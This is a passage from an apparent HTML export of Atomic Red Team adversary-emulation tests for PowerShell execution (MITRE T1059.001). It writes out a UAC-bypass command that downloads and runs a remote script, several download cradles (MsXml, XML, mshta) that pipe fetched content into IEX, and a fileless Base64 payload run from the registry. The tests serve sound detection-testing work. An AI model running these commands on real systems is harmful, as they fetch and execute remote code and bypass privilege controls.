<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 06a220b6-7e29-4bd8-9d07-5b4d86742372</li>
<li><strong>name</strong>: Invoke-AppPathBypass</li>
<li><strong>description</strong>: Note: Windows 10 only. Upon execution windows backup and restore window will be opened.</li>
</ul>
<p>Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da</li>
<li><strong>name</strong>: Powershell MsXml COM object - with prompt</li>
<li><strong>description</strong>: Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.</li>
</ul>
<p>Provided by https://github.com/mgreen27/mgreen27.github.io</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 4396927f-e503-427b-b023-31049b9b09a6</li>
<li><strong>name</strong>: Powershell XML requests</li>
<li><strong>description</strong>: Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.</li>
</ul>
<p>Provided by https://github.com/mgreen27/mgreen27.github.io</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8a2ad40b-12c7-4b25-8521-2737b0a415af</li>
<li><strong>name</strong>: Powershell invoke mshta.exe download</li>
<li><strong>description</strong>: Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".</li>
</ul>
<p>Provided by https://github.com/mgreen27/mgreen27.github.io</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: cc50fa2a-a4be-42af-a88f-e347ba0bf4d7</li>
<li><strong>name</strong>: Powershell Invoke-DownloadCradle</li>
<li>
<p><strong>description</strong>: Provided by https://github.com/mgreen27/mgreen27.github.io
Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: No command available</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: fa050f5e-bc75-4230-af73-b6fd7852cd73</li>
<li><strong>name</strong>: PowerShell Fileless Script Execution</li>
<li>
<p><strong>description</strong>: Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that
art-marker.txt is in the folder.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1059.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7c1acec2-78fa-4305-a3e0-db2a54cddecd</li>
<li><strong>name</strong>: PowerShell Session Creation and Use</li>
<li>
<p><strong>description</strong>: Connect to a remote powershell session and interact with the host.
Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-PSSession -ComputerName #{hostname_to_connect}
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use</p>
</li>
<li>
<p><strong>prereq_command</strong>: Try {
    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Enable-PSRemoting</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
